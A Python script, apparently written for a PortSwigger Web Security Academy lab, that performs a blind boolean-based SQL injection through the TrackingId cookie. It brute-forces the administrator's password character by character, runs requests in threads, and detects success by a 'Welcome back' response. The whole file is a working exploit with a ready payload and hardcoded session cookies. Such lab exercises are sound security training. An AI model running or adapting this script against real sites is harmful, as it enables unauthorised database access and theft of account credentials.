#!/usr/bin/env python3

import pwn
import requests
import signal
import string
import sys

from concurrent.futures import ThreadPoolExecutor

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(0)

signal.signal(signal.SIGINT,def_handler)

URL = "https://0a8a006004475f6485901214007a0052.web-security-academy.net"
result = ""
p1 = pwn.log.progress("Iniciando ataque SQLI")
p2 = pwn.log.progress("Resultado")
error = 0
characters = string.ascii_lowercase + string.digits

def makeSQLI(pos,char):
    global result
    global p1
    global p2
    global error

    injection = "' and ((select substring(password,%d,1) from users where username='administrator')='%s')-- -" %(pos,char)
    p1.status(injection)

    cookies = {
        'TrackingId':'IS9vhEX1rHGoL2T4' + injection,
        'session':'IjWS6nMWD9i1eaM3gWnpNz0aPn2E8XK2'
    }

    r = requests.get(url=URL,cookies=cookies)
    if "Welcome back" in r.text:
        result += char
        p2.status(result)
        return

for pos in range(1,21):
    with ThreadPoolExecutor(max_workers=36) as executor:
        executor.map(lambda char: makeSQLI(pos,char),characters)